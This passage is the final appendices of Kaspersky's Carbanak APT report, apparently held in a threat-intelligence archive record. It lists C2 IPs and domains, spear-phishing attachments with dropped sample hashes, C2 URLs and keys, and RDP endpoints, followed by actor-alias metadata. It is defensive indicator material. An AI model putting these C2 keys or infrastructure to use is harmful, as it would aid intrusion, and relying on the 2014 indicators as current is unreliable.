to\n\nCarbanak\n\n74.208.170.163 2014-10 Related to\n\nCarbanak\n\n78.129.184.4 2014-10 Related to\n\nCarbanak\n\n\nSource: Sample md5/Detection name/\nSystem Comment\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\nVictim's logs\n\nInternet scan\n\nVictim's logs\n\n100d516821d99b09718b362d5a4b9a2f\n\n972092CBE7791D27FC9FF6E9ACC12CC3\n\n08f83d98b18d3dff16c35a20e24ed49a\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\nVictim's logs CnC of other malware\nused to install\nCarbanak\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\n972092CBE7791D27FC9FF6E9ACC12CC3\n\nVictim's logs CnC of other malware\nused to install\nCarbanak\n\nVictim's logs CnC of other malware\nused to install\nCarbanak\n\nVictim's logs Used by criminals\nto control infected\nmachines\n\nVictim's logs Used by criminals\nto control infected\nmachines\n\n\n-----\n\nIP/Domain name\n\n\nFirst\nseen in Type\n\n\n79.99.6.187 2014-08 Related to\n\nCarbanak\n\n81.4.110.128 2014-08 Related to\n\nCarbanak\n\n83.16.41.202 2014-10 Related to\n\nCarbanak\n\n83.166.234.250 2014-10 Carbanak’s\n\nWindows\nbackconnect\n\n83.246.67.58 2014-10 Related to\n\nCarbanak\n\n85.25.117.154 2014-10 Related to\n\nCarbanak\n\n85.25.20.109 2014-10 Related to\n\nCarbanak\n\n85.25.207.212 2014-10 Related to\n\nCarbanak\n\n87.106.8.177 2014-10 Related to\n\nCarbanak\n\n87.98.153.34 2014-10 Related to\n\nCarbanak\n\n88.198.184.241 2014-12 Carbanak’s\n\nWindows\nbackconnect\n\n91.194.254.38 2014-07 Carbanak’s\n\nLinux CnC\n\n91.194.254.90 2014-09 Carbanak’s\n\nLinux CnC\n\n91.194.254.91 2014-09 Carbanak’s\n\nLinux CnC\n\n91.194.254.92 2014-07 Carbanak’s\n\nLinux CnC\n\n91.194.254.93 2014-07 Carbanak’s\n\nLinux CnC\n\n91.194.254.94 2014-07 Carbanak’s\n\nLinux CnC\n\n91.194.254.98 2014-07 Carbanak’s\n\nLinux CnC\n\n\nSource: Sample md5/Detection name/\nSystem Comment\n\nVictim's logs CnC of other malware\nused to install\nCarbanak\n\nVictim's logs Used by criyminals\nto control infected\nmachines\n\nVictim's logs Used by criminals\nto control infected\nmachines\n\nF66992766D8F9204551B3C42336B4F6D\n\nVictim's logs CnC of other malware\nused to install\nCarbanak\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\nVictim's logs Used by criminals\nto control infected\nmachines\n\nVictim's logs Exploits used to install\nCarbanak\n\nVictim's logs Used by criminals\nto control infected\nmachines\n\n6AE1BB06D10F253116925371C8E3E74B\n\n446c75b77836b776ec3f502fce48b014\n\nVictim's logs\n\nVictim's logs\n\nInternet scan\n\nInternet scan\n\nInternet scan\n\nInternet scan\n\n\n-----\n\nIP/Domain name\n\n\nFirst\nseen in Type\n\n\n93.95.102.109 2014-10 Related to\n\nCarbanak\n\n93.95.99.232 2014-10 Related to\n\nCarbanak\n\n94.247.178.230 2014-10 Related to\n\nCarbanak\n\n95.0.250.113 2014-10 Related to\n\nCarbanak\n\nadguard.name 2014-07 Carbanak’s\n\nLinux CnC\n\n\nbeefeewhewhush­\neelu.biz\n\n\n2014-07 Andromeda's\n\nC&C\n\n\nSource: Sample md5/Detection name/\nSystem Comment\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\nVictim's logs\n\nVictim's logs CnC of other malware\nused to install\nCarbanak\n\nVictim's logs\n\n1684a5eafd51852c43b4bca48b58980f\n\nInternet scan\n\ncb915d1bd7f21b29edc179092e967331\n\n446c75b77836b776ec3f502fce48b014\n\n4afafa81731f8f02ba1b58073b47abdf\n\n4afafa81731f8f02ba1b58073b47abdf\n\nreverse IP 91.194.254.93\n\nreverse IP 146.185.220.200\n\n972092CBE7791D27FC9FF6E9ACC12CC3\n\n6AE1BB06D10F253116925371C8E3E74B\n\n0AD4892EAD67E65EC3DD4C978FCE7D92\n\nVictim's logs Used by criminals\nto control infected\nmachines\n\nVictim's logs CnC of other malware\nused to install\n\n\nblizko.net 2014-07 Carbanak’s\n\nLinux CnC\n\ncomixed.org 2014-12 Carbanak’s\n\nLinux CnC\n\ncoral-trevel.com 2014-07 Carbanak’s\n\nLinux CnC\n\ndatsun-auto.com 2014-04 Carbanak’s\n\nLinux CnC\n\ndi-led.com 2014-07 Carbanak’s\n\nLinux CnC\n\n\nfinancialnewson­\nline.pw\n\n\n2014-07 Carbanak’s\n\nLinux CnC\n\n\nfinancialwiki.pw 2014-07 Carbanak’s\n\nLinux CnC\n\nflowindaho.info 2014-07 Carbanak’s\n\nLinux CnC\n\nfreemsk-dns.com 2014-08 Carbanak’s\n\nLinux CnC\n\ngjhhghjg6798.com 2014-10 Carbanak’s\n\nLinux CnC\n\nglonass-map.com 2014-12 Carbanak’s\n\nLinux CnC\n\ngreat-codes.com 2014-10 Carbanak’s\n\nLinux CnC\n\nicafyfootsinso.ru 2014-08 Related to\n\nCarbanak\n\nidedroatyxoaxi.ru 2014-08 Related to\n\nCarbanak\n\n\n-----\n\nIP/Domain name\n\n\nFirst\nseen in Type\n\n\nivaserivaseeer.biz 2014-08 Related to\n\nCarbanak\n\n\nmicroloule461soft­\nc1pol361.com\n\nmicrosoftc1pol361.\ncom\n\n\n2014-10 Carbanak’s\n\nLinux CnC\n\n2014-10 Carbanak’s\n\nLinux CnC\n\n\nmind-finder.com 2014-07 Carbanak’s\n\nLinux CnC\n\n\noperatemesscont.\nnet\n\n\n2014-08 Connect to\n\ninfected sshd\n\n\nSource: Sample md5/Detection name/\nSystem Comment\n\nVictim's logs CnC of other malware\nused to install\nCarbanak\n\nF66992766D8F9204551B3C42336B4F6D\n\nF66992766D8F9204551B3C42336B4F6D\n\n0AD4892EAD67E65EC3DD4C978FCE7D92\n\nVictim's logs Used by criminals\nto control infected\nmachines\n\nInternet scan\n\nreverse IP 146.185.220.200\n\nInternet scan\n\nreverse IP 131.72.138.18\n\nreverse IP 131.72.138.18\n\nreverse IP 91.194.254.94\n\nreverse IP 91.194.254.38\n\nreverse IP 146.185.220.200\n\nInternet scan\n\n08f83d98b18d3dff16c35a20e24ed49a\n\n551d41e2a4dd1497b3b27a91922d29cc\n\n551d41e2a4dd1497b3b27a91922d29cc\n\n\nparadise-plaza.com 2014-07 Carbanak’s\n\nLinux CnC\n\npublic-dns.us 2014-08 Carbanak’s\n\nLinux CnC\n\npublics-dns.com 2014-07 Carbanak’s\n\nLinux CnC\n\nsystemsvc.net 2014-11 Carbanak’s\n\nLinux CnC\n\nsystem-svc.net 2014-11 Carbanak’s\n\nLinux CnC\n\ntraider-pro.com 2014-12 Carbanak’s\n\nLinux CnC\n\ntravel-maps.info 2014-07 Carbanak’s\n\nLinux CnC\n\nupdate-java.net 2014-08 Carbanak’s\n\nLinux CnC\n\nveslike.com 2014-07 Carbanak’s\n\nLinux CnC\n\n\nwefwe3223wfdsf.\ncom\n\n\n2014-10 Carbanak’s\n\nLinux CnC\n\n\nworldnews24.pw 2014-08 Carbanak’s\n\nLinux CnC\n\nworldnewsonline.pw 2014-08 Carbanak’s\n\nLinux CnC\n\n\n-----\n\n## APPENDIX 4: Spear phishing\n\nThis section contains details on spear phishing emails sent by the attackers to\ninfect victims.\n\nMD5: 8fa296efaf87ff4d9179283d42372c52\nName of attachment: Соответствие ФЗ-­115 от 24.06.2014г.doc\nDrops executable:\nMD5: a1979aa159e0c54212122fd8acb24383 (Carbanak)\nCompiled Mon Apr 04 20:00:57 2011 (Probably fake)\nC2 on update-­java.net\nC2 key 1234567812345678\nRDP on 37.235.54.48:443\n\nMD5: 665b6cb31d962aefa3037b5849889e06\nName of attachment: Запрос.doc\nDrops executable:\nMD5: 4afafa81731f8f02ba1b58073b47abdf (Carbanak)\nCompiled Tue Jul 01 03:20:06 2014\nConnects to:\n\u0007financialnewsonline.pw/FYocDxXpn5MXsHwZX/kLUAbd3w2/uUTsarcVKYk2W3B6hnc\nZ/Gafh8U1W805Lo0N/np7E3ICR6qx8keLDJZqUGXJKBDzfc6VYz9TNIlktObQ.htm\n(185.10.58.175)\nC2 on financialnewsonline.pw, financialwiki.pw\nC2 key TXeyuryWcIuzxkWnyu\nRDP on 185.10.56.59:443\n\nMD5: 2c395f211db2d02cb544448729d0f081\nName of attachment: new.doc\nDrops executable:\nMD5: 551d41e2a4dd1497b3b27a91922d29cc (Carbanak)\nCompiled Mon Aug 04 01:10:40 2014\nConnects to:\n\u0007http://worldnewsonline.pw/JybDHkfWGURJPuWeUpPMX/ca9BThbDim0Hdk/9YzkJS7\nm8a19tzQwZxo1vvQ/r/7SHJcCm4tdpZGp.dmDwKfMjpWBM18eX8VUiimyaUZMGoClZ6\neShS9tLCKtuHvlMQ3Dc26y90FbPIua.7LGHGZCBPj.vd08DUENC5oAE4VfyUz.shtml\nC2s on worldnewsonline.pw, worldnews24.pw\nC2 key JDvkyfhZxkMmDSwUkqvReIvC\nRDP on 185.10.56.59:443\n\nMD5: 31e16189e9218cb131fdb13e75d0a94f\nName of attachment: Анкета-­Заявление.doc\nDrops executable:\nMD5: 4e107d20832fff89a41f04c4dff1739b (Carbanak)\nC2 on public-­dns.us\nC2 key 1234567812345678\nRDP on 37.235.54.48:443\n\n\n-----\n\nMD5: db83e301564ff613dd1ca23c30a387f0\nName of attachment: Соответствие ФЗ-­115 от 21.07.2014г.doc\nDrops executable:\nMD5: cb915d1bd7f21b29edc179092e967331 (Carbanak)\nCompiled Tue Apr 08 05:44:12 2014\nConnects to:\n\u0007datsun-­auto.com/bDqxEs/Ta6IPJq3zqmRY-­.5/8SgGLA-­\nF/I9CstBYT1rK7kx.440Sbtru.cgi?QVzF=tNM2gdtMLscx5bB4uryjM&PfpxBukmcOaD-­\nUcygbtzv4=f8fx\n\nMD5: f88a983fc0ef5bb446ae63250e7236dd\nName of attachment: Приглашение.msg\nDrops executable:\nMD5: 3dc8c4af51c8c367fbe7c7feef4f6744 (Carbanak)\nCompiled Fri Aug 08 00:48:07 2014\nC2s on worldnewsonline.pw, worldnews24.pw\nC2 key vfDGbiwmiqdN6E2N\nRDP on 185.10.56.59:443\n\nMD5: c4a6a111a070856c49905d815f87ab49\nName of attachment: ЧОСВЯЮООАГЖЦСЦЧОЧю\nDrops executable:\nMD5: cb915d1bd7f21b29edc179092e967331 (Carbanak)\nConnects to:\n\u0007GET\n/cBAWFvkXi94QxShRTaVVn/YzAxD/X0sZEud.5gNItbvozI3tqT5ly9UYLVii13.bml?tlxCFi\nBusj=2OVj&9GP=a5houGz&K.F=T&l0.7FBN75=nMPDrlGXq4s7cIAQ0Cl662IwVjxvsiTOlG\n0d0pd\nHTTP/1.1\nHost: datsun-­auto.com\n\nMD5: 86e48a9be62494bffb3b8e5ecb4a0310\nName of attachment: Приглашение.doc\nDrops executable:\nMD5: 3dc8c4af51c8c367fbe7c7feef4f6744 (Carbanak)\nCompiled Fri Aug 08 00:48:07 2014\n\nMD5: 6c7ac8dfd7bc5c2bb1a6d7aec488c298\nName of attachment: Соответствие ФЗ-­115 от 02.07.2014г..doc,\nDrops executable:\nMD5: cb915d1bd7f21b29edc179092e967331 (Carbanak)\nCompiled Tue Apr 08 05:44:12 2014\nConnects to:\n\u0007datsun-­auto.com/bDqxEs/Ta6IPJq3zqmRY-­.5/8SgGLA-­\nF/I9CstBYT1rK7kx.440Sbtru.cgi?QVzF=tNM2gdtMLscx5bB4uryjM&PfpxBukmcOaD-­\nUcygbtzv4=f8fx\n\n\n-----\n\n## APPENDIX 5: MD5 hashes of Carbanak samples\n\n\n0022c1fe1d6b036de2a08d50ac5446a5\n0155738045b331f44d300f4a7d08cf21\n0275585c3b871405dd299d458724db3d\n0ad4892ead67e65ec3dd4c978fce7d92\n0ad6da9e62a2c985156a9c53f8494171\n1046652e0aaa682f89068731fa5e8e50\n10e0699f20e31e89c3becfd8bf24cb4c\n1300432e537e7ba07840adecf38e543b\n15a4eb525072642bb43f3c188a7c3504\n16cda323189d8eba4248c0a2f5ad0d8f\n1713e551b8118e45d6ea3f05ec1be529\n1a4635564172393ae9f43eab85652ba5\n1b9b9c8db7735f1793f981d0be556d88\n1d1ed892f62559c3f8234c287cb3437c\n1e127b92f7102fbd7fa5375e4e5c67d1\n1e47e12d11580e935878b0ed78d2294f\n1f43a8803498482d360befc6dfab4218\n1fd4a01932df638a8c761abacffa0207\n20f8e962b2b63170b228ccaff51aeb7d\n26d6bb7a4e84bec672fc461487344829\n2908afb4de41c64a45e1eb2503169108\n2c6112e1e60f083467dc159ffb1ceb6d\n2cba1a82a78f4dcbad1087c1b71588c9\n2e2aa05a217aacf3105b4ba2288ad475\n36cdf98bc79b6997dd4e3a6bed035dca\n36dfd1f3bc58401f7d8b56af682f2c38\n39012fb6f3a93897f6c5edb1a57f76a0\n3dc8c4af51c8c367fbe7c7feef4f6744\n407795b49789c2f9ca6eca1fbab3c73e\n45691956a1ba4a8ecc912aeb9f1f0612\n4afafa81731f8f02ba1b58073b47abdf\n4e107d20832fff89a41f04c4dff1739b\n4f16b33c074f1c31d26d193ec74aaa56\n50f70e18fe0dedabefe9bf7679b6d56c\n5443b81fbb439972de9e45d801ce907a\n55040dd42ccf19b5af7802cba91dbd7f\n551d41e2a4dd1497b3b27a91922d29cc\n56bfe560518896b0535e0e4da44266d6\n5aeecb78181f95829b6eeeefb2ce4975\n5da203fa799d79ed5dde485c1ed6ba76\n608bdeb4ce66c96b7a9289f8cf57ce02\n6163103103cdacdc2770bd8e9081cfb4\n629f0657e70901e3134dcae2e2027396\n\n\n643c0b9904b32004465b95321bb525eb\n6e564dadc344cd2d55374dbb00646d1b\n735ff7defe0aaa24e13b6795b8e85539\n751d2771af1694c0d5db9d894bd134ca\n763b335abecbd3d9a6d923a13d6c2519\n763e07083887ecb83a87c24542d70dc5\n7b30231709f1ac69e4c9db584be692f0\n7d0bbdda98f44a5b73200a2c157077df\n7e3253abefa52aeae9b0451cfb273690\n874058e8d8582bf85c115ce319c5b0af\n88c0af9266679e655298ce19e231dff1\n8ace0c156eb6f1548b96c593a15cbb25\n933ab95dbf7eb0e9d9470a9272bfaff3\n93e44ecfcffdbb1f7f3119251ddb7670\n972092cbe7791d27fc9ff6e9acc12cc3\n9865bb3b4e7112ec9269a98e029cf5cb\n9ad8c68b478e9030859d8395d3fdb870\n9f455f0efe8c5ff69adcc456dcf00da6\na1979aa159e0c54212122fd8acb24383\na4bfd2cfbb235d869d87f5485853edae\na8dc8985226b7b2c468bb82bad3e4d76\naa55dedff7f5dbe2cc4a47f2f8d44f94\nac5d3fc9da12255759a4a7e4eb3d63e7\nacb01930466438d3ee981cb4fc57e196\nacb4c5e2f92c84df15faa4846f17ff4e\nb2e6d273a9b32739c9a26f267ab7d198\nb328a01f5b82830cc250e0e429fca69f\nb400bb2a2f9f0ce176368dc709359d3d\nb6c08d0db4ca1d9e16f3e164745810ff\nb79f7d41e30cf7d69a4d5d19dda8942e\nbddbb91388dd2c01068cde88a5fb939e\nc179ad6f118c97d3db5e04308d48f89e\nc1b48ca3066214a8ec988757cc3022b3\nc2472adbc1f251acf26b6deb8e7a174b\nc687867e2c92448992c0fd00a2468752\nc77331b822ca5b78c31b637984eda029\ncb915d1bd7f21b29edc179092e967331\ncc294f8727addc5d363bb23e10be4af2\nd943ccb4a3c802d304ac29df259d14f2\ndb3e8d46587d86519f46f912700372e0\ndbd7d010c4657b94f49ca85e4ff88790\ne06a0257449fa8dc4ab8ccb6fbf2c50b\ne613e5252a7172329ee25525758180a4\n\n\n-----\n\ne742242f28842480e5c2b3357b7fd6ab\ne938f73a10e3d2afbd77dd8ecb3a3854\neaee5bf17195a03d6bf7189965ee1bdb\nef8e417e5adb2366a3279d6680c3b979\nf4eddae1c0b40bfedeb89e814a2267a5\nf66992766d8f9204551b3c42336b4f6d\nfad3a7ea0a0c6cb8e20e43667f560d7f\nfbc310a9c431577f3489237d48763eea\nff7fd55796fa66c8245c0b90157c57c7\n100d516821d99b09718b362d5a4b9a2f\n6ae1bb06d10f253116925371c8e3e74b\n72eff79f772b4c910259e3716f1acf49\n85a26581f9aadeaa6415c01de60f932d\n9ad6e0db5e2f6b59f14dd55ded057b69\na70fea1e6eaa77bdfa07848712efa259\nbe935b4b3c620558422093d643e2edfe\nc70cce41ef0e4a206b5b48fa2d460ba4\n41fb85acedc691bc6033fa2c4cf6a0bc\n1684a5eafd51852c43b4bca48b58980f\n08f83d98b18d3dff16c35a20e24ed49a\n\n\n-----\n\n[Securelist, the resource](https://securelist.com/)\nfor Kaspersky Lab experts’\ntechnical research,\nanalysis, and thoughts.\n\n\nFollow us\n\n\nDailyThreatPostBusinessAcademyEugeneSecureList\n\n\nKaspersky Lab global Website DailyThreatPostBusinessAcademyEugene Eugene Kaspersky Blog\n\nDaily Kaspersky Lab B2C Blog DailyBusiness Kaspersky Lab B2B Blog\n\nDailyThreatPostBusinessAcademy Kaspersky Lab security news service DailyBusinessAcademy Kaspersky Lab Academy\n\n\nDailyThreatPostBusinessAcademyEugene\n\n\nDailyBusinessAcademy\n\n\nDailyThreatPostBusinessAcademy\n\n\n-----\n\n### Kaspersky Lab HQ\n\n39A/3 Leningradskoe Shosse\nMoscow, 125212\nRussian Federation\n\n[more contact details](http://www.kaspersky.com/about/contactinfo/contacts_global_hq)\n\nTel: +7-495-797-8700\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/p7qzcury97tuwk26694uutujwqmwqyhe",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2015/2015.02.16.Carbanak.APT/Carbanak_APT_eng.pdf"
    ],
    "report_names": [
        "Carbanak_APT_eng"
    ],
    "threat_actors": [
        {
            "id": "c9617bb6-45c8-495e-9759-2177e61a8e91",
            "created_at": "2022-10-25T15:50:23.405039Z",
            "updated_at": "2025-03-27T02:00:55.462193Z",
            "deleted_at": null,
            "main_name": "Carbanak",
            "aliases": [
                "Carbanak",
                "Anunak"
            ],
            "source_name": "MITRE:Carbanak",
            "tools": [
                "Carbanak",
                "Mimikatz",
                "PsExec",
                "netsh"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "bb8702c5-52ac-4359-8409-998a7cc3eeaf",
            "created_at": "2023-01-06T13:46:38.405479Z",
            "updated_at": "2025-03-27T02:00:02.82533Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "JokerStash",
                "ATK32",
                "G0046",
                "Coreid",
                "Carbanak",
                "Sangria Tempest",
                "CARBON SPIDER",
                "GOLD NIAGARA",
                "G0008",
                "ELBRUS",
                "Carbon Spider"
            ],
            "source_name": "MISPGALAXY:FIN7",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ed3810b7-141a-4ed0-8a01-6a972b80458d",
            "created_at": "2022-10-25T16:07:23.443259Z",
            "updated_at": "2025-03-27T02:02:09.801771Z",
            "deleted_at": null,
            "main_name": "Carbanak",
            "aliases": [
                "Anunak",
                "Carbanak",
                "Carbon Spider",
                "ELBRUS",
                "Gold Waterfall",
                "Sangria Tempest"
            ],
            "source_name": "ETDA:Carbanak",
            "tools": [
                "AVE_MARIA",
                "Agentemis",
                "AmmyyRAT",
                "Antak",
                "Anunak",
                "Ave Maria",
                "AveMariaRAT",
                "BABYMETAL",
                "BIRDDOG",
                "Backdoor Batel",
                "Batel",
                "Bateleur",
                "BlackMatter",
                "Boostwrite",
                "Cain & Abel",
                "Carbanak",
                "Cl0p",
                "Cobalt Strike",
                "CobaltStrike",
                "DNSMessenger",
                "DNSRat",
                "DNSbot",
                "DRIFTPIN",
                "DarkSide",
                "FOXGRABBER",
                "FlawedAmmyy",
                "HALFBAKED",
                "JS Flash",
                "KLRD",
                "MBR Eraser",
                "Mimikatz",
                "Nadrac",
                "Odinaff",
                "POWERPIPE",
                "POWERSOURCE",
                "PsExec",
                "SQLRAT",
                "Sekur",
                "Sekur RAT",
                "SocksBot",
                "SoftPerfect Network Scanner",
                "Spy.Agent.ORM",
                "TEXTMATE",
                "TeamViewer",
                "TiniMet",
                "TinyMet",
                "Toshliph",
                "VB Flash",
                "WARPRISM",
                "avemaria",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716498,
    "ts_updated_at": 1743041818,
    "ts_creation_date": 1424011858,
    "ts_modification_date": 1424011882,
    "files": {
        "pdf": "https://archive.orkl.eu/99af231600ee8fd83b4b4fb057429e60cd9d21c4.pdf",
        "text": "https://archive.orkl.eu/99af231600ee8fd83b4b4fb057429e60cd9d21c4.txt",
        "img": "https://archive.orkl.eu/99af231600ee8fd83b4b4fb057429e60cd9d21c4.jpg"
    }
}